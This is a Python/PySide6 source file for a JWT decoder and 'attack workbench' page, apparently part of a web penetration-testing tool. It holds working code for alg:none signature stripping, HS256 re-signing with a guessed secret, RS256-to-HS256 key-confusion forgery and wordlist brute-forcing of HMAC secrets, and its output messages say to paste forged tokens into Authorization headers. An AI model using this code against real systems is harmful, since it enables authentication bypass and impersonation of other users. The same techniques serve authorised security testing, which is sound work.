"""
JwtPage — Interactive JWT decoder and attack workbench.

Decodes JWTs, lets users edit claims inline, and runs:
  • alg:none attack (strip signature, change alg to "none")
  • HS256 re-sign  (sign payload with a known/guessed secret)
  • RS256 → HS256 algorithm confusion (use RSA pubkey as HMAC secret)
  • Wordlist brute-force of HMAC secret (QThread)

All crypto is pure-stdlib (base64, hmac, hashlib) — no external JWT library.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
from pathlib import Path

from PySide6.QtCore import Qt, QThread, QTimer, Signal
from PySide6.QtGui import QFont
from PySide6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QSplitter,
    QLabel, QPushButton, QLineEdit, QTextEdit, QFrame,
    QFileDialog, QApplication,
)

from gui.utilities.syntax_highlighter import SyntaxHighlighter

log = logging.getLogger(__name__)

_BTN = (
    "QPushButton{background:#313244;color:#CDD6F4;border:1px solid #45475A;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#45475A;}"
)
_BTN_ACCENT = (
    "QPushButton{background:#1A2E28;color:#94E2D5;border:1px solid #94E2D5;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;font-weight:bold;}"
    "QPushButton:hover{background:#253E36;}"
)
_BTN_ORANGE = (
    "QPushButton{background:#2E1E10;color:#FAB387;border:1px solid #FAB387;"
    "border-radius:4px;padding:0 14px;min-height:26px;font-size:10px;font-weight:bold;}"
    "QPushButton:hover{background:#3E2A18;}"
)


# ── JWT helpers ───────────────────────────────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s = s.replace('-', '+').replace('_', '/')
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()


def _parse_jwt(token: str):
    """
    Returns (header_dict, payload_dict, sig_hex, header_b64, payload_b64).
    header_dict/payload_dict are None on error.
    """
    token = token.strip()
    parts = token.split('.')
    if len(parts) < 2:
        return None, None, "", "", ""
    try:
        header = json.loads(_b64url_decode(parts[0]).decode('utf-8', errors='replace'))
        payload_raw = _b64url_decode(parts[1])
        try:
            payload = json.loads(payload_raw.decode('utf-8', errors='replace'))
        except Exception:
            payload = {"_raw": payload_raw.hex()}
        sig_hex = _b64url_decode(parts[2]).hex() if len(parts) > 2 and parts[2] else ""
        return header, payload, sig_hex, parts[0], parts[1]
    except Exception as exc:
        log.debug("jwt parse: %s", exc)
        return None, None, "", "", ""


def _sign_hs256(h_b64: str, p_b64: str, secret: bytes) -> str:
    msg = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(secret, msg, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


def _alg_none_attack(h_b64: str, p_b64: str) -> str:
    try:
        h = json.loads(_b64url_decode(h_b64).decode())
        h['alg'] = 'none'
        new_h = _b64url_encode(json.dumps(h, separators=(',', ':')).encode())
        return f"{new_h}.{p_b64}."
    except Exception as exc:
        return f"Error: {exc}"


# ── Brute-force worker ────────────────────────────────────────────────────────

class _BruteWorker(QThread):
    found    = Signal(str)
    progress = Signal(str)
    done     = Signal()

    def __init__(self, h_b64: str, p_b64: str, sig_b64: str,
                 wordlist: str, parent=None):
        super().__init__(parent)
        self._h    = h_b64
        self._p    = p_b64
        self._sig  = sig_b64
        self._path = wordlist
        self._stop = False

    def stop(self) -> None:
        self._stop = True

    def run(self) -> None:
        msg = f"{self._h}.{self._p}".encode()
        try:
            with open(self._path, errors='replace') as f:
                for i, line in enumerate(f):
                    if self._stop:
                        self.progress.emit("Stopped.")
                        break
                    secret = line.strip()
                    if not secret:
                        continue
                    candidate = hmac.new(
                        secret.encode(), msg, hashlib.sha256
                    ).digest()
                    if _b64url_encode(candidate) == self._sig:
                        self.found.emit(secret)
                        self.done.emit()
                        return
                    if i % 5000 == 0 and i:
                        self.progress.emit(f"Tried {i:,} candidates…")
        except Exception as exc:
            self.progress.emit(f"Error: {exc}")
        self.done.emit()


# ── JWT Page ──────────────────────────────────────────────────────────────────

class JwtPage(QWidget):
    """Interactive JWT decoder and attack workbench (nav index 14)."""

    send_to_repeater = Signal(str)

    def __init__(self, repository=None, parent=None):
        super().__init__(parent)
        self._repo        = repository
        self._token       = ""
        self._h_b64       = ""
        self._p_b64       = ""
        self._sig_b64     = ""
        self._wordlist    = ""
        self._brute: _BruteWorker | None = None
        self._save_timer  = None   # created after _build_ui
        self._build_ui()
        self._save_timer = QTimer(self)
        self._save_timer.setSingleShot(True)
        self._save_timer.setInterval(1500)
        self._save_timer.timeout.connect(self._save_state)
        # trigger save on any text change
        self._token_input.textChanged.connect(self._save_timer.start)
        self._pay_edit.textChanged.connect(self._save_timer.start)
        self._secret_in.textChanged.connect(self._save_timer.start)
        self._pubkey_in.textChanged.connect(self._save_timer.start)
        self._restore_state()

    # ── public API ─────────────────────────────────────────────────────────────

    def load_token(self, token: str) -> None:
        self._token_input.setText(token.strip())
        self._parse()

    # ── UI ────────────────────────────────────────────────────────────────────

    def _build_ui(self) -> None:
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # Toolbar
        tb = QHBoxLayout()
        tb.setContentsMargins(8, 6, 8, 6)
        tb.setSpacing(6)

        title = QLabel("⚿  JWT Analyzer")
        title.setStyleSheet("color:#FAB387; font-size:11px; font-weight:bold;")
        tb.addWidget(title)

        self._token_input = QLineEdit()
        self._token_input.setPlaceholderText("Paste JWT token here…")
        self._token_input.setFont(QFont("Cascadia Code", 9))
        self._token_input.setStyleSheet(
            "QLineEdit{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
            "border-radius:4px;padding:3px 6px;font-size:9px;}"
            "QLineEdit:focus{border-color:#FAB387;}"
        )
        self._token_input.returnPressed.connect(self._parse)
        tb.addWidget(self._token_input, stretch=1)

        for label, slot, ss in [
            ("Parse", self._parse, _BTN_ACCENT),
            ("Clear", self._clear, _BTN),
            ("Copy Output", self._copy_output, _BTN),
        ]:
            btn = QPushButton(label)
            btn.setFixedHeight(26)
            btn.setStyleSheet(ss)
            btn.clicked.connect(slot)
            tb.addWidget(btn)

        root.addLayout(tb)

        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setFixedHeight(1)
        sep.setStyleSheet("background:#313244; border:none;")
        root.addWidget(sep)

        # Main horizontal split: left (views) | right (attacks)
        main = QSplitter(Qt.Horizontal)
        main.setChildrenCollapsible(False)
        main.setStyleSheet("QSplitter::handle{background:#313244;width:3px;}")

        # ── Left: three vertical panes ────────────────────────────────────────
        left = QWidget()
        left_vb = QVBoxLayout(left)
        left_vb.setContentsMargins(0, 0, 0, 0)
        left_vb.setSpacing(0)

        vert = QSplitter(Qt.Vertical)
        vert.setChildrenCollapsible(False)
        vert.setStyleSheet("QSplitter::handle{background:#313244;height:3px;}")

        self._hdr_pane, self._hdr_edit = self._make_pane("HEADER",    "#89B4FA", ro=True)
        self._pay_pane, self._pay_edit = self._make_pane("PAYLOAD",   "#A6E3A1", ro=False)
        self._sig_pane, self._sig_edit = self._make_pane("SIGNATURE", "#6C7086", ro=True)

        vert.addWidget(self._hdr_pane)
        vert.addWidget(self._pay_pane)
        vert.addWidget(self._sig_pane)
        vert.setSizes([130, 220, 60])
        left_vb.addWidget(vert)
        main.addWidget(left)

        # ── Right: attack panel ───────────────────────────────────────────────
        right = QWidget()
        right.setMinimumWidth(260)
        right.setStyleSheet("background:#181825;")
        right_vb = QVBoxLayout(right)
        right_vb.setContentsMargins(8, 8, 8, 8)
        right_vb.setSpacing(6)

        right_vb.addWidget(self._sec_lbl("ATTACKS"))

        alg_btn = QPushButton("alg:none Attack")
        alg_btn.setFixedHeight(28)
        alg_btn.setStyleSheet(_BTN_ORANGE)
        alg_btn.clicked.connect(self._do_alg_none)
        right_vb.addWidget(alg_btn)

        # HS256
        right_vb.addWidget(self._sec_lbl("SIGN HS256"))
        self._secret_in = QLineEdit()
        self._secret_in.setPlaceholderText("HMAC secret…")
        self._secret_in.setFont(QFont("Cascadia Code", 9))
        self._secret_in.setStyleSheet(
            "QLineEdit{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
            "border-radius:4px;padding:3px 6px;font-size:9px;}"
        )
        right_vb.addWidget(self._secret_in)
        hs_btn = QPushButton("Sign with Secret ▶")
        hs_btn.setFixedHeight(26)
        hs_btn.setStyleSheet(_BTN_ACCENT)
        hs_btn.clicked.connect(self._do_hs256)
        right_vb.addWidget(hs_btn)

        # RS256 → HS256
        right_vb.addWidget(self._sec_lbl("RS256 → HS256 CONFUSION"))
        self._pubkey_in = QTextEdit()
        self._pubkey_in.setPlaceholderText("Paste RSA public key PEM here…")
        self._pubkey_in.setMaximumHeight(70)
        self._pubkey_in.setFont(QFont("Cascadia Code", 8))
        self._pubkey_in.setStyleSheet(
            "QTextEdit{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
            "border-radius:4px;padding:4px;font-size:9px;}"
        )
        right_vb.addWidget(self._pubkey_in)
        rs_btn = QPushButton("RS256→HS256 ▶")
        rs_btn.setFixedHeight(26)
        rs_btn.setStyleSheet(_BTN_ACCENT)
        rs_btn.clicked.connect(self._do_rs256_hs256)
        right_vb.addWidget(rs_btn)

        # Brute force
        right_vb.addWidget(self._sec_lbl("BRUTE FORCE"))
        bf_wl = QHBoxLayout()
        self._wl_lbl = QLabel("No wordlist selected")
        self._wl_lbl.setStyleSheet("color:#6C7086; font-size:9px;")
        self._wl_lbl.setWordWrap(True)
        bf_wl.addWidget(self._wl_lbl, stretch=1)
        browse = QPushButton("Browse…")
        browse.setFixedHeight(22)
        browse.setStyleSheet(_BTN)
        browse.clicked.connect(self._browse_wl)
        bf_wl.addWidget(browse)
        right_vb.addLayout(bf_wl)

        bf_row = QHBoxLayout()
        self._brute_btn = QPushButton("▶ Start")
        self._brute_btn.setFixedHeight(26)
        self._brute_btn.setStyleSheet(_BTN_ACCENT)
        self._brute_btn.clicked.connect(self._start_brute)
        bf_row.addWidget(self._brute_btn, stretch=1)
        self._stop_btn = QPushButton("■ Stop")
        self._stop_btn.setFixedHeight(26)
        self._stop_btn.setEnabled(False)
        self._stop_btn.setStyleSheet(_BTN)
        self._stop_btn.clicked.connect(self._stop_brute)
        bf_row.addWidget(self._stop_btn)
        right_vb.addLayout(bf_row)

        right_vb.addWidget(self._sec_lbl("OUTPUT"))
        self._output = QTextEdit()
        self._output.setReadOnly(True)
        self._output.setFont(QFont("Cascadia Code", 8))
        self._output.setStyleSheet(
            "QTextEdit{background:#11111B;color:#CDD6F4;border:none;padding:6px;}"
        )
        right_vb.addWidget(self._output, stretch=1)

        # Copy-token bar — shows the last generated token ready to paste
        tok_row = QHBoxLayout()
        tok_lbl = QLabel("Last token:")
        tok_lbl.setStyleSheet("color:#6C7086; font-size:8px;")
        tok_row.addWidget(tok_lbl)
        self._token_out = QLineEdit()
        self._token_out.setReadOnly(True)
        self._token_out.setPlaceholderText("run an attack to generate a token…")
        self._token_out.setStyleSheet(
            "QLineEdit{background:#11111B;color:#A6E3A1;border:1px solid #313244;"
            "border-radius:3px;padding:0 6px;font-size:8px;font-family:'Cascadia Code';}"
        )
        tok_row.addWidget(self._token_out, stretch=1)
        copy_tok_btn = QPushButton("Copy")
        copy_tok_btn.setFixedHeight(24)
        copy_tok_btn.setFixedWidth(48)
        copy_tok_btn.setStyleSheet(_BTN_ACCENT)
        copy_tok_btn.clicked.connect(self._copy_token)
        tok_row.addWidget(copy_tok_btn)
        right_vb.addLayout(tok_row)

        main.addWidget(right)
        main.setSizes([520, 280])
        root.addWidget(main, stretch=1)

    def _sec_lbl(self, text: str) -> QLabel:
        lbl = QLabel(text)
        lbl.setStyleSheet(
            "color:#6C7086; font-size:8px; letter-spacing:1.5px;"
            "border-bottom:1px solid #313244; padding-bottom:2px; margin-top:2px;"
        )
        return lbl

    def _make_pane(self, label: str, accent: str, ro: bool):
        wrapper = QWidget()
        wrapper.setStyleSheet("background:#11111B;")
        vb = QVBoxLayout(wrapper)
        vb.setContentsMargins(0, 0, 0, 0)
        vb.setSpacing(0)

        hdr_w = QWidget()
        hdr_w.setFixedHeight(22)
        hdr_w.setStyleSheet(f"background:#181825; border-bottom:1px solid #313244;")
        hdr_row = QHBoxLayout(hdr_w)
        hdr_row.setContentsMargins(8, 0, 8, 0)
        lbl = QLabel(label)
        lbl.setStyleSheet(
            f"color:{accent}; font-size:9px; font-weight:bold; background:transparent;"
        )
        hdr_row.addWidget(lbl)
        hdr_row.addStretch()
        vb.addWidget(hdr_w)

        edit = QTextEdit()
        edit.setReadOnly(ro)
        edit.setFont(QFont("Cascadia Code", 9))
        edit.setStyleSheet(
            "QTextEdit{background:#11111B;color:#CDD6F4;border:none;padding:8px;}"
        )
        SyntaxHighlighter(edit.document())
        vb.addWidget(edit)
        return wrapper, edit

    # ── persistence ───────────────────────────────────────────────────────────

    def _save_state(self) -> None:
        if not self._repo:
            return
        try:
            self._repo.save_page_state("jwt", {
                "token":   self._token_input.text(),
                "payload": self._pay_edit.toPlainText(),
                "secret":  self._secret_in.text(),
                "pubkey":  self._pubkey_in.toPlainText(),
                "wordlist": self._wordlist,
            })
        except Exception:
            pass

    def _restore_state(self) -> None:
        if not self._repo:
            return
        try:
            state = self._repo.load_page_state("jwt")
        except Exception:
            return
        if not state:
            return
        token = state.get("token", "")
        if token:
            self._token_input.setText(token)
            self._parse()
            # Restore edited payload (may differ from parsed original)
            saved_payload = state.get("payload", "")
            if saved_payload and saved_payload != self._pay_edit.toPlainText():
                self._pay_edit.setPlainText(saved_payload)
        if state.get("secret"):
            self._secret_in.setText(state["secret"])
        if state.get("pubkey"):
            self._pubkey_in.setPlainText(state["pubkey"])
        if state.get("wordlist"):
            self._wordlist = state["wordlist"]
            from pathlib import Path as _Path
            self._wl_lbl.setText(_Path(self._wordlist).name)

    # ── operations ────────────────────────────────────────────────────────────

    def _log(self, msg: str) -> None:
        self._output.append(msg)

    def _parse(self) -> None:
        token = self._token_input.text().strip()
        if not token:
            return
        self._token = token
        header, payload, sig_hex, h_b64, p_b64 = _parse_jwt(token)
        if header is None:
            self._log("Error: not a valid JWT (expected header.payload.signature).")
            return
        self._h_b64   = h_b64
        self._p_b64   = p_b64
        # Store sig as base64url (the raw third part) for brute-force comparison
        parts = token.split('.')
        self._sig_b64 = parts[2] if len(parts) > 2 else ""

        self._hdr_edit.setPlainText(json.dumps(header, indent=2))
        self._pay_edit.setPlainText(json.dumps(payload, indent=2))
        self._sig_edit.setPlainText(sig_hex)
        self._log(
            f"Parsed | alg={header.get('alg','?')} | "
            f"{'signed' if self._sig_b64 else 'no signature'}"
        )

    def _clear(self) -> None:
        self._token_input.clear()
        for edit in (self._hdr_edit, self._pay_edit, self._sig_edit, self._output):
            edit.clear()
        self._token_out.clear()
        self._token = self._h_b64 = self._p_b64 = self._sig_b64 = ""

    def _set_result_token(self, token: str) -> None:
        self._token_out.setText(token)
        self._token_out.setCursorPosition(0)

    def _copy_token(self) -> None:
        tok = self._token_out.text()
        if tok:
            QApplication.clipboard().setText(tok)

    def _copy_output(self) -> None:
        txt = self._output.toPlainText()
        if txt:
            QApplication.clipboard().setText(txt)

    def _current_payload_b64(self) -> str:
        """Re-encode the (possibly edited) payload JSON."""
        raw = self._pay_edit.toPlainText().strip()
        try:
            obj = json.loads(raw)
            return _b64url_encode(json.dumps(obj, separators=(',', ':')).encode())
        except Exception:
            return _b64url_encode(raw.encode())

    def _require_parsed(self) -> bool:
        if not self._h_b64:
            self._log("Parse a JWT token first.")
            return False
        return True

    def _do_alg_none(self) -> None:
        if not self._require_parsed():
            return
        result = _alg_none_attack(self._h_b64, self._current_payload_b64())
        self._set_result_token(result)
        self._log(
            f"\n[alg:none attack]\n"
            f"Modified JWT (alg set to 'none', signature stripped):\n"
            f"{result}\n"
            f"→ Copy the token above and paste it into Authorization: Bearer <token>. "
            f"If the server accepts it, signature verification is not enforced."
        )

    def _do_hs256(self) -> None:
        if not self._require_parsed():
            return
        secret = self._secret_in.text()
        if not secret:
            self._log("Enter an HMAC secret first.")
            return
        p_b64 = self._current_payload_b64()
        try:
            h = json.loads(_b64url_decode(self._h_b64).decode())
            h['alg'] = 'HS256'
            h_b64 = _b64url_encode(json.dumps(h, separators=(',', ':')).encode())
        except Exception:
            h_b64 = self._h_b64
        result = _sign_hs256(h_b64, p_b64, secret.encode())
        self._set_result_token(result)
        self._log(
            f"\n[HS256 re-sign — secret: {secret!r}]\n"
            f"Signed JWT:\n{result}\n"
            f"→ Copy the token above and paste it into Authorization: Bearer <token>. "
            f"Payload claims have been preserved (edit them above before signing)."
        )

    def _do_rs256_hs256(self) -> None:
        if not self._require_parsed():
            return
        pubkey = self._pubkey_in.toPlainText().strip()
        if not pubkey:
            self._log("Paste the server RSA public key PEM first.")
            return
        p_b64 = self._current_payload_b64()
        try:
            h = json.loads(_b64url_decode(self._h_b64).decode())
            h['alg'] = 'HS256'
            h_b64 = _b64url_encode(json.dumps(h, separators=(',', ':')).encode())
        except Exception:
            h_b64 = self._h_b64
        result = _sign_hs256(h_b64, p_b64, pubkey.encode())
        self._set_result_token(result)
        self._log(
            f"\n[RS256→HS256 key confusion]\n"
            f"JWT signed with RSA public key as HMAC secret:\n{result}\n"
            f"→ Copy the token above and paste it into Authorization: Bearer <token>. "
            f"If the server uses the public key as the HS256 secret, this token will verify."
        )

    def _browse_wl(self) -> None:
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Wordlist", "", "Text files (*.txt);;All files (*)"
        )
        if path:
            self._wordlist = path
            self._wl_lbl.setText(Path(path).name)

    def _start_brute(self) -> None:
        if not self._require_parsed():
            return
        if not self._sig_b64:
            self._log("No signature in token — nothing to brute-force.")
            return
        if not self._wordlist:
            self._log("Select a wordlist first (Browse…).")
            return
        self._log(f"\n[Brute Force] Starting — {self._wordlist}")
        self._brute_btn.setEnabled(False)
        self._stop_btn.setEnabled(True)
        self._brute = _BruteWorker(
            self._h_b64, self._current_payload_b64(),
            self._sig_b64, self._wordlist, parent=self,
        )
        def _on_found(secret: str) -> None:
            signed = _sign_hs256(self._h_b64, self._current_payload_b64(), secret.encode())
            self._set_result_token(signed)
            self._log(
                f"[Brute Force] SECRET FOUND: {secret!r}\n"
                f"Signed token ready — copy it from the bar below."
            )
        self._brute.found.connect(_on_found)
        self._brute.progress.connect(self._log)
        self._brute.done.connect(self._on_brute_done)
        self._brute.start()

    def _stop_brute(self) -> None:
        if self._brute:
            self._brute.stop()

    def _on_brute_done(self) -> None:
        self._brute_btn.setEnabled(True)
        self._stop_btn.setEnabled(False)
        self._log("[Brute Force] Done.")
